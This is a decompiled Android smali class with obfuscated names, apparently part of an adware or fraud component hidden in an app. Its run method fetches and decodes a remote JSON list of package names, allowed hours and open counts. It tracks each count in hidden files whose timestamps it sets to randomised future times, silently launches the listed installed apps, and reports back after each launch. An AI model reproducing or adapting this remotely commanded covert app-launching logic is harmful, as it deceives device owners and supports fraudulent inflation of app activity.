.class final Lbiz/nlnrnqn/noknlnkno/bv;
.super Lbiz/nlnrnqn/noknlnkno/bx;


# instance fields
.field final synthetic a:Lbiz/nlnrnqn/noknlnkno/bt;


# direct methods
.method constructor <init>(Lbiz/nlnrnqn/noknlnkno/bt;)V
    .locals 0

    iput-object p1, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-direct {p0}, Lbiz/nlnrnqn/noknlnkno/bx;-><init>()V

    return-void
.end method

.method private static a(JILorg/json/JSONArray;)J
    .locals 10

    const-wide/16 v8, 0x3e8

    const-wide/16 v6, 0xe10

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2, p0, p1}, Ljava/util/Random;-><init>(J)V

    invoke-virtual {p3}, Lorg/json/JSONArray;->length()I

    move-result v0

    div-int/lit8 v1, v0, 0x2

    if-ge p2, v1, :cond_0

    mul-int/lit8 v0, p2, 0x2

    invoke-virtual {p3, v0}, Lorg/json/JSONArray;->optInt(I)I

    move-result v0

    mul-int/lit8 v1, p2, 0x2

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {p3, v1}, Lorg/json/JSONArray;->optInt(I)I

    move-result v1

    :goto_0
    if-ge v0, v1, :cond_1

    invoke-virtual {v2}, Ljava/util/Random;->nextLong()J

    move-result-wide v2

    sub-int/2addr v1, v0

    int-to-long v4, v1

    mul-long/2addr v4, v6

    rem-long v1, v2, v4

    int-to-long v3, v0

    mul-long/2addr v3, v6

    add-long v0, v1, v3

    mul-long/2addr v0, v8

    add-long/2addr v0, p0

    :goto_1
    return-wide v0

    :cond_0
    mul-int/lit8 v0, v1, 0x2

    add-int/lit8 v0, v0, -0x2

    invoke-virtual {p3, v0}, Lorg/json/JSONArray;->optInt(I)I

    move-result v0

    mul-int/lit8 v1, v1, 0x2

    add-int/lit8 v1, v1, -0x1

    invoke-virtual {p3, v1}, Lorg/json/JSONArray;->optInt(I)I

    move-result v1

    goto :goto_0

    :cond_1
    int-to-long v0, v0

    mul-long/2addr v0, v6

    mul-long/2addr v0, v8

    add-long/2addr v0, p0

    goto :goto_1
.end method

.method private a(Ljava/lang/String;Lorg/json/JSONObject;)Z
    .locals 2

    const/4 v0, 0x0

    if-eqz p2, :cond_0

    invoke-static {p1, p2}, Lbiz/nlnrnqn/noknlnkno/ay;->a(Ljava/lang/String;Lorg/json/JSONObject;)Landroid/content/Intent;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    :try_start_0
    iget-object v1, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-virtual {v1}, Lbiz/nlnrnqn/noknlnkno/bt;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :cond_1
    :goto_0
    if-eqz v0, :cond_2

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-virtual {v1, v0}, Lbiz/nlnrnqn/noknlnkno/bt;->startActivity(Landroid/content/Intent;)V

    iget-object v0, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-static {v0, p1}, Lbiz/nlnrnqn/noknlnkno/ae;->b(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lbiz/nlnrnqn/noknlnkno/bv;->a(Ljava/lang/String;)[B

    const/4 v0, 0x1

    :goto_1
    return v0

    :cond_2
    const/4 v0, 0x0

    goto :goto_1

    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public final run()V
    .locals 14

    const/4 v1, 0x0

    iget-object v0, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-static {v0}, Lbiz/nlnrnqn/noknlnkno/bs;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    iget-object v0, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-static {v0}, Lbiz/nlnrnqn/noknlnkno/ae;->h(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lbiz/nlnrnqn/noknlnkno/bv;->a(Ljava/lang/String;)[B

    move-result-object v0

    if-eqz v0, :cond_0

    array-length v2, v0

    const/16 v3, 0x8

    if-le v2, v3, :cond_0

    invoke-static {v0}, Lbiz/nlnrnqn/noknlnkno/ae;->b([B)[B

    move-result-object v0

    new-instance v3, Lorg/json/JSONArray;

    new-instance v2, Ljava/lang/String;

    const-string v4, "UTF-8"

    invoke-direct {v2, v0, v4}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-direct {v3, v2}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v4

    move v2, v1

    :goto_1
    if-ge v2, v4, :cond_0

    invoke-virtual {v3, v2}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v5

    if-eqz v5, :cond_3

    const-string v0, "open_max_counts"

    const/4 v6, 0x0

    invoke-virtual {v5, v0, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v6

    const-string v0, "open_hours"

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v7

    if-lez v6, :cond_5

    if-eqz v7, :cond_5

    invoke-virtual {v7}, Lorg/json/JSONArray;->length()I

    move-result v0

    const/4 v8, 0x2

    if-lt v0, v8, :cond_5

    const-string v0, "pkg_name"

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    iget-object v0, p0, Lbiz/nlnrnqn/noknlnkno/bv;->a:Lbiz/nlnrnqn/noknlnkno/bt;

    invoke-static {v0, v8}, Lbiz/nlnrnqn/noknlnkno/bs;->a(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v11, "ao/"

    invoke-direct {v0, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v8}, Lbiz/nlnrnqn/noknlnkno/by;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lbiz/nlnrnqn/noknlnkno/ae;->a(Ljava/lang/String;)Ljava/io/File;

    move-result-object v11

    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-static {v11}, Lbiz/nlnrnqn/noknlnkno/ag;->a(Ljava/io/File;)J

    move-result-wide v12

    long-to-int v0, v12

    if-gez v0, :cond_2

    move v0, v1

    :cond_2
    if-ge v0, v6, :cond_5

    invoke-virtual {v11}, Ljava/io/File;->lastModified()J

    move-result-wide v12

    cmp-long v6, v9, v12

    if-ltz v6, :cond_5

    add-int/lit8 v6, v0, 0x1

    int-to-long v12, v6

    invoke-static {v11, v12, v13}, Lbiz/nlnrnqn/noknlnkno/ag;->a(Ljava/io/File;J)Z

    invoke-static {v9, v10, v0, v7}, Lbiz/nlnrnqn/noknlnkno/bv;->a(JILorg/json/JSONArray;)J

    move-result-wide v6

    invoke-virtual {v11, v6, v7}, Ljava/io/File;->setLastModified(J)Z

    const-string v0, "o_intent"

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    invoke-direct {p0, v8, v0}, Lbiz/nlnrnqn/noknlnkno/bv;->a(Ljava/lang/String;Lorg/json/JSONObject;)Z

    move-result v0

    :goto_2
    if-nez v0, :cond_0

    :cond_3
    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_1

    :cond_4
    invoke-virtual {v11}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    const-wide/16 v5, 0x0

    invoke-static {v11, v5, v6}, Lbiz/nlnrnqn/noknlnkno/ag;->a(Ljava/io/File;J)Z

    const/4 v0, 0x0

    invoke-static {v9, v10, v0, v7}, Lbiz/nlnrnqn/noknlnkno/bv;->a(JILorg/json/JSONArray;)J

    move-result-wide v5

    invoke-virtual {v11, v5, v6}, Ljava/io/File;->setLastModified(J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_5
    move v0, v1

    goto :goto_2

    :catch_0
    move-exception v0

    goto/16 :goto_0
.end method
